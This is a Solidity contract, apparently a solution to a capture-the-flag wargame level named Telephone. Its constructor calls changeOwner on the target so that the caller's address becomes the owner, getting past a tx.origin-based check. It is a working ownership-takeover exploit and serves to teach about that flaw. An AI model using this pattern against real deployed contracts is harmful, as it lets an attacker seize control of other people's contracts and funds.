// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract TelephoneHack {
    Telephone private immutable target;

    constructor(address _target) {
        target = Telephone(_target);
        target.changeOwner(msg.sender);
    }
}
